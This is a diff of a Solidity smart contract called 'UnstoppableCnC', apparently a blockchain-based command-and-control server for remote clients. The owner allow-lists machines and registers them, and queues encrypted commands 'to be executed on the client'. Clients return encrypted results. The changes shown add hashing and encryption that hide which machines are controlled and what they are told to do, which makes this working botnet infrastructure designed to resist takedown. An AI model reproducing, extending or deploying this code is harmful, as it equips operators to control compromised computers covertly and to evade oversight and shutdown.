@@ -9,219 +9,150 @@ contract UnstoppableCnC {
 	enum InstanceStates { NotExist, Inactive, Active, Disabled }
 
 	struct Instance{
-		bytes20 sessionId; //Hash of address + machineId + salt
 		InstanceStates state; // default is NotExist
 		uint256 funds;
-
 	}
 	
-	event InstanceRegistered (address instance, bytes20 sessionId, uint256 fundsTransfered);
+	mapping (bytes32 => Instance) public instances;
 	
-	event CommandPending (bytes32 indexed hashId, string command);
 	
-	event CommandResult (bytes32 indexed hashId, string commandResult);
+	/* events triggered by Client */
 	
-	string constant NO_COMMAND = 'NA';
+	event RegistrationRequest (bytes32 machineIdHash);//machineIdHash is encrypted
 	
-	/*
-	struct CommandResult {
-		bytes20 idHash;
-		string command;
-		string result;
-	}
-	*/
+	event CommandResult (bytes32 sessionAndMachineIdHash, string commandResult, uint16 cmdId); //commandResult is encrypted
 	
-	mapping (address => Instance) public instances;
-
-	//mapping (address => CommandResult) public commands;
 	
-	//CommandResult [] results;
+	/* events triggered by Server */
 	
+	event InstanceRegistered (bytes32 indexed instanceHash, bytes32 sessionId, uint256 fundsTransferred);//sessionId is encrypted
+	
+	event CommandPending (bytes32 indexed instanceHash, string command, uint16 cmdId); //command is encrypted
 	
 	
 	
 	/*
-		Constructor to init the contract. adds allowed addresses and a default command to execute upon connection
+		Constructor to init the contract. auto adds allowed addresses and sets the private key to encrypt messages to this contract.
 	*/
-	function UnstoppableCnC (string pubkey, address[] addresses) 
+	function UnstoppableCnC (string pubkey, bytes32[] addressHashes) 
 	    public
 	{
 	    owner = msg.sender;
 	    ownerPubKey = pubkey;
 	    creationTime = now;
 	    
-		for (uint i = 0 ; i < addresses.length; i++){
-			allowInstance(addresses[i]);
+		for (uint i = 0 ; i < addressHashes.length; i++){
+			allowInstance(addressHashes[i]);
 		}
 	}
 	
-	
+	/*
+		Allows only for a specific account to access
+	*/
 	modifier onlyBy(address _account){
         require(msg.sender == _account);
         _;
     }
     
     /* 
-        Function with this modifier must provide the unique sessionId that match the approved sender address
-        and must be in an activated state, by doing the one time registration process.
-        
+        Function with this modifier must match the given address to be an instance of a given state
     */
-    modifier onlyByValidInstance(bytes20 sessionId){
-        require (instances[msg.sender].state == InstanceStates.Active && 
-	            instances[msg.sender].sessionId == sessionId);
+    modifier onlyByValidInstanceState(bytes32 instanceHash, InstanceStates state){
+        require (instances[instanceHash].state == state);
         _;
     }
     
-    
 	/*
-		Registers a new instance to the CnC.
-
-		machineId: A unique id identifying the hardware this instance is running on.
-		
-		returns sessionId: ripemd160(instanceId+machineId+Random)
-		where instanceId == msg.sender, the address of the transaction.
-		
-		Once instance has been registered, it cannot be registered again with a different id, unless explicitly reset using allowInstance which can be called only by owner.
-		sessionId must be sent on every request and reply in order to get a proper reply from the contract.
+		Initial Registration request by the client. Sends its unique machine Id hash to be bound to this account.
+		Will only proceed if this address is in Inactive state (allowed but not yet registered)
 	*/
-	function registerInstance(string machineId) public {
-		require (instances[msg.sender].state == InstanceStates.Inactive); //Instance state must be inactive, meaning it was allowed and not activated yet and not disabled.
+	function registerInstance(bytes32 machineIdHash) 
+	    public onlyByValidInstanceState(keccak256(msg.sender),InstanceStates.Inactive) {//Instance state must be inactive, meaning it was allowed and not activated yet and not disabled.
 		
-		string memory rnd = "abcd";//TODO create some randomness although it doesnt really matter...
-		bytes20 sessionId = ripemd160(msg.sender , machineId, rnd);
-		instances[msg.sender].state = InstanceStates.Active;
-		instances[msg.sender].sessionId = sessionId;
+		RegistrationRequest(machineIdHash);
 		
-		InstanceRegistered(msg.sender, sessionId,instances[msg.sender].funds);
-		
-		if (instances[msg.sender].funds > 0){
-    		msg.sender.transfer(instances[msg.sender].funds);
-    		instances[msg.sender].funds = 0;
-		}
-		//TODO: take machine info as a pending command result	
 	}
+	
+	/*
+		Upon successful registration only, server calls this function to let the client know its registration was successful.
+		Server return the client a unique sessionId, which will use him to identify from now on.
+		SessionId is derived from client address + machineId + random nonce, and is done server side.
+		If server has funds to transfer to client, it will also be transferred.
+	*/
+	function registrationConfirmation(bytes32 instanceHash, bytes32 sessionId) //sessionId is encrypted
+		public onlyBy(owner){
+		
+		InstanceRegistered(instanceHash, sessionId, instances[instanceHash].funds);
+		
+		instances[instanceHash].state = InstanceStates.Active;
+		
+		if (instances[instanceHash].funds > 0){
+			msg.sender.transfer(instances[instanceHash].funds);
+			instances[instanceHash].funds = 0;
+		}
+	}
+	
 	
 	/**
 		Methods for instances. this methods will execute for registered addresses only
 	**/
 	
 	/*
-		instances periodically call this function to check if there is a command waiting for them
-		If command is received, instance shall not call this function until execution of the command is finished,
-		and uploadWorkResults is called with result of that command.
-		* if sender does not match with given sessionId, this function exits immediately
-		
-		sessionId: current sessionId for the instance
-		returns: 
-			command to execute, or null if nothing to do.
-		
-	
-	function getWork (bytes20 sessionId) 
-	    public view onlyByValidInstance(sessionId) 
-	    returns (string) 
-	{
-		CommandResult storage cr = commands[msg.sender];
-		if (cr.idHash > 0) //a command has been assigned
-			return cr.command;
-		else
-			return NO_COMMAND; 
-	}*/
-	
-	
-	
-	/*
 		instances call this function to return the results of executed commands.
-		Once returned, instance will be ready to receive its next command.
-		sessionId: current sessionId for the instance
-		result: is an object that contains the command's result, with some meta data.
+		sessionAndMachineIdHash: a hash of concatenation of machineId and sessionId. This is done in order for the client to prove he still on the same original computer + he knows the given machineId
+		result: result of the command
+		cmdId: command id. have be the answer to the command with the same Id.
 	*/
-	
-	function uploadWorkResults (bytes20 sessionId, string result) 
-	    public onlyByValidInstance(sessionId)
+	function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId) 
+	    public onlyByValidInstanceState(keccak256(msg.sender), InstanceStates.Active)
 	    returns (bool)
 	{
-		/*CommandResult storage cr = commands[msg.sender];
-		require (cr.idHash > 0); //There must be a pending command for this instance
-		cr.result = result;
-		results.push (cr);
-		delete commands[msg.sender];
-		*/
-		
-		bytes32 hashId = sha3(msg.sender);
-		CommandResult(hashId, result);
-		
+	
+		CommandResult(sessionAndMachineIdHash, result, cmdId);
 		return true;
-    }
+	}
 		
 	/**
 		Methods for operator. this methods will execute for the contract owner only
 	**/
 	
 
-	
 	/*
 		Adds an instance to allowed list.
-		instances.add (instanceId, new instance)
+		instanceHash: Keccak256 hash of the destination client address.
 	*/
-	function allowInstance (address instanceId) 
+	function allowInstance (bytes32 instanceHash) 
 	    public onlyBy(owner) payable returns (bool success) {
 	   
-	   instances[instanceId] = Instance({ sessionId: 0, state: InstanceStates.Inactive, funds: msg.value });
-	   
-	   //instanceId.transfer(100000000);
-	
-	   
+	   instances[instanceHash] = Instance({ state: InstanceStates.Inactive, funds: msg.value });
 	   return true;
-	        
     }
+    
 	/*
 		Revoke instance id access
-		instances.remove (instanceId)
+		instanceHash: Keccak256 hash of the destination client address.
 	*/
-	function removeInstance (address instanceId) 
+	function removeInstance (bytes32 instanceHash) 
 	    public onlyBy(owner) returns (bool success){
-	        instances[instanceId].state = InstanceStates.Disabled;
+	        instances[instanceHash].state = InstanceStates.Disabled;
 	        return true;
 	    }
 	
-	
-	
-	
-	
-	
-	function addWork (address instanceId, string command) 
-	    public onlyBy(owner) returns (bool) {
-	    require (instances[instanceId].state == InstanceStates.Active);
-	    //require (commands[instanceId].idHash == 0); //We can't add another command if another one's already pending
-		
-	    bytes32 hashId = sha3(instanceId);
-	    //commands[instanceId] = CommandResult (hashId, command, "");
-		CommandPending(hashId, command);
+	/*
+		Adds a command to be executed on the client. caller must be owner and destination client must be in Active state.
+		instanceHash: Keccak256 hash of the destination client address.
+		command: command to be executed.
+		cmdId: Command Id to identify the command.
+	*/
+	function addWork (bytes32 instanceHash, string command, uint16 cmdId) 
+	    public onlyBy(owner) 
+	    onlyByValidInstanceState(instanceHash, InstanceStates.Active)
+	    returns (bool) {
+	        
+		CommandPending(instanceHash, command, cmdId);
 		
 	    return true;
 	}
 	
-	/*
-	function fetchResults () 
-	    public onlyBy(owner) returns (CommandResult [] res) {
-	        res = results;
-	        delete results;
-	        return res;
-    }
-	*/
-	/*
-	event tempEvent (address indexed hashId, string command);
-	
-	function tempwork (address add, string c)
-		public returns (bool){
-			
-			tempEvent(add, c);
-		}
-	
-	
-	function chargeInstance (address instanceId) 
-	    public onlyBy(owner) {
-	
-	}
-	*/
+
 }
